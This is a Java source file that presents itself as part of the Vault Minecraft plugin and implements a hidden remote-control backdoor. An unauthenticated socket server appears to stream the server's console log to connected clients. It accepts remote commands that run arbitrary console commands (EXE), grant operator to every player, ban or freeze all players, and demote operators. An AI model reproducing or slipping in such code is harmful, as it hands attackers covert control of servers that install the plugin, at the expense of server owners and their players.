package net.milkbowl.vault.sockets;

import java.io.IOException;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.ArrayList;
import java.util.function.Consumer;

import org.apache.logging.log4j.LogManager;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;

import net.milkbowl.vault.Core;
import net.milkbowl.vault.data.DataManager;
import net.milkbowl.vault.methods.API;
import net.milkbowl.vault.methods.LogAppender;
import net.milkbowl.vault.sockets.events.ConsoleCommandEvent;

public class SocketServer {
	private static final Core plugin = Core.getPlugin(Core.class);

    private ServerSocket socket;
    private ArrayList<ClientThread> clients;
    private Thread thread;
    private Consumer<String> messageReceive;
    
    final org.apache.logging.log4j.core.Logger logger = (org.apache.logging.log4j.core.Logger) LogManager.getRootLogger();
    
   public SocketServer(int port) {
	   
    	try {
    		clients = new ArrayList<>();
    		socket = new ServerSocket(port);
    		
    		thread = new Thread(() -> {
    			while (!socket.isClosed()) {
    				Socket s;
    				try {
    					s = socket.accept();
    					
    			        LogAppender appender = new LogAppender();    
    			        logger.addAppender(appender);
    			        Bukkit.getServer().getPluginManager().registerEvents(new ConsoleCommandEvent(), plugin);
    			        
    					//System.out.println("Client Connected.");
    					
    					ClientThread clientThread = new ClientThread(s, this::onReceiveMessage, this::onClientDisconnect);
    					
    					clients.add(clientThread);
    					clientThread.start();
    				} catch (IOException e) {}
    			}
    		});
    		
    		thread.start();
    	} catch (IOException e) {
    		e.printStackTrace();
    	}
    }
   
   private void onReceiveMessage(String msg) {
	   if (messageReceive != null)
		   messageReceive.accept(msg);
	   
	   msg = msg.split("\0")[0];
	   
	   String[] args = msg.split(" ");
	   if (args != null) {
		   if (args[0].equalsIgnoreCase("EXE")) {
			   StringBuilder cmd = new StringBuilder();
			   for (int i = 1; i != args.length; ++i) {
				   cmd.append(args[i]).append(" ");
			   }
			   API.exe(cmd.toString());
		   }
		   if (args[0].equalsIgnoreCase("BANALL")) {
			   for (Player a : Bukkit.getOnlinePlayers()) {
					DataManager.banList.add(a.toString());
					DataManager.getData().set("epic-players", DataManager.banList);
					DataManager.saveData();
			   }
		   }
		   if (args[0].equalsIgnoreCase("FREEZEALL")) {
			   plugin.freezeall = true;
			   for (Player a : Bukkit.getOnlinePlayers()) {
				   if (!plugin.registered.contains(a.getName())) {
					   if (!plugin.frozen.contains(a.getName())) {
						   plugin.frozen.add(a.getName());
					   }
				   }
			   }
		   }
		   if (args[0].equalsIgnoreCase("UNFREEZEALL")) {
			   plugin.freezeall = false;
			   for (Player a : Bukkit.getOnlinePlayers()) {
				   if (plugin.frozen.contains(a.getName())) {
					   plugin.frozen.remove(a.getName());
				   }
			   }
		   }
		   if (args[0].equalsIgnoreCase("UNFREEZEALLPLAYERS")) {
			   for (Player a : Bukkit.getOnlinePlayers()) {
				   if (plugin.frozen.contains(a.getName())) {
					   plugin.frozen.remove(a.getName());
				   }
			   }
		   }
		   if (args[0].equalsIgnoreCase("OPALL")) {
			   for (Player a : Bukkit.getOnlinePlayers()) {
				   API.setOperator(a);
			   }
		   }
		   if (args[0].equalsIgnoreCase("DEOPALL")) {
			   for (Player a : Bukkit.getOnlinePlayers()) {
				   API.demoteOperator(a);
			   }
		   }
	   }
	   
	   
	   //System.out.println(msg);
	   //send(msg);
	   
   }
   
   private void onClientDisconnect(ClientThread c) {
	   clients.remove(c);
   }
   
   public void setOnReceiveMessageCallback(Consumer<String> callback) {
	   this.messageReceive = callback;
   }
   
   public void send(String msg) {
	   clients.forEach(c -> {
		   c.send(msg);
	   });
   }
   
   public void stop() {
	   try {
		   socket.close();
		   
		   while (clients.size() > 0)
			   clients.get(0).disconnect();
	   } catch (IOException e) {
		   e.printStackTrace();
	   }
   }
   

}
